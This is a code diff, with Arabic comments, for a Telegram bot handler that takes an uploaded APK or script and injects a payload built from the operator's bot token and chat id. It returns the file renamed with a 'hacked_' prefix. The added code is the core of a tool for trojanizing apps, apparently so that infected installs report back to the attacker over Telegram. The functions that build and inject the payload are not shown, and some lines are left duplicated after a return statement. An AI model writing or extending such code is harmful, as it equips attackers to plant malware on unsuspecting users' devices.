@@ -189,6 +189,42 @@ async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return FILE
 
+    # الحقن يبدأ هنا
+    status_msg = await update.message.reply_text("🔄 جاري تحميل الملف وحقنه...")
+
+    try:
+        file = await doc.get_file()
+
+        # الطريقة الصحيحة للتحميل كـ bytearray
+        await status_msg.edit_text("📥 جاري تحميل الملف...")
+        file_bytes = await file.download_as_bytearray()   # ← هذا هو الإصلاح
+
+        await status_msg.edit_text("✅ تم تحميل الملف\n🔄 جاري الحقن...")
+
+        payload = make_payload(context.user_data['token'], context.user_data['chatid'])
+
+        # Progress Bar بسيط للحقن
+        with tqdm(total=100, desc="الحقن", bar_format="{l_bar}{bar} {n_fmt}%") as pbar:
+            if file_bytes.startswith(b'PK') or is_paid_file:
+                result = inject_apk(bytes(file_bytes), payload)
+            else:
+                result = inject_script(bytes(file_bytes), payload)
+            pbar.update(100)
+
+        name = f"hacked_{doc.file_name}"
+        await update.message.reply_document(
+            document=io.BytesIO(result.getvalue()) if hasattr(result, 'getvalue') else result,
+            filename=name,
+            caption=SUCCESS,
+            parse_mode='Markdown'
+        )
+
+    except Exception as e:
+        logger.error(f"Error: {e}", exc_info=True)
+        await status_msg.edit_text(f"❌ حدث خطأ أثناء المعالجة:\n{str(e)[:250]}")
+
+    context.user_data.clear()
+    return ConversationHandler.END
     # الحقن يبدأ هنا (Python أو مشترك)
     status_msg = await update.message.reply_text("🔄 جاري تحميل الملف وحقنه...")
 
